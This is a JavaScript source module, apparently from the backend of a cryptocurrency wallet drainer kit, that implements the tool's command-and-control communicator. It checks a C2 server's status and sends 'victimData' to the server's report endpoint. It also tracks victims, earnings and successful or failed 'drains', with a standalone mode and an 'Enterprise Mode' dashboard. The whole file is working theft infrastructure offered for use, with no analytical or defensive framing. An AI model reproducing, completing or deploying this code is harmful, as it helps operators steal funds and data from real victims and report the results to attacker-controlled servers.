// backend/modules/c2Communicator.js
import { C2_SERVER_URL } from '../config.js';

export class C2Communicator {
    constructor() {
        this.isInitialized = false;
        this.baseUrl = C2_SERVER_URL;
        this.stats = {
            totalVictims: 0,
            totalEarnings: 0,
            successfulDrains: 0,
            failedDrains: 0,
            lastActivity: new Date().toISOString()
        };
        this.clientId = process.env.CLIENT_ID || "default-client";
        this.standaloneMode = !C2_SERVER_URL || C2_SERVER_URL.includes('localhost');
    }

    async initialize() {
        if (this.isInitialized) return true;
        
        console.log(`🔄 Initializing ${this.constructor.name}...`);
        
        if (this.standaloneMode) {
            console.log('🏠 C2: Standalone Mode - No central dashboard');
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized in standalone mode`);
            return true;
        }
        
        try {
            console.log(`🌐 C2: Enterprise Mode - Connecting to ${this.baseUrl}`);
            await this.testC2Connection();
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized - Connected to C2 dashboard`);
            return true;
        } catch (error) {
            console.log('⚠️ C2 dashboard unavailable - running in standalone mode');
            this.isInitialized = true;
            return true;
        }
    }

    async testC2Connection() {
        if (this.standaloneMode) return { status: 'standalone' };
        
        try {
            console.log('🧪 Testing C&C connection...');
            const response = await fetch(`${this.baseUrl}/api/c2/status`);
            const data = await response.json();
            console.log('✅ C&C dashboard connected');
            return data;
        } catch (error) {
            console.log('❌ C&C connection failed');
            throw error;
        }
    }

    async reportToC2(victimData) {
        if (this.standaloneMode) {
            this.updateStats(victimData);
            return true;
        }
        
        try {
            const response = await fetch(`${this.baseUrl}/api/c2/report`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(victimData)
            });
            if (response.ok) {
                this.updateStats(victimData);
                return true;
            }
            return false;
        } catch {
            this.updateStats(victimData);
            return false;
        }
    }

    updateStats(victimData) {
        this.stats.lastActivity = new Date().toISOString();
    }

    getStats() { return this.stats; }
}

export const c2Communicator = new C2Communicator();
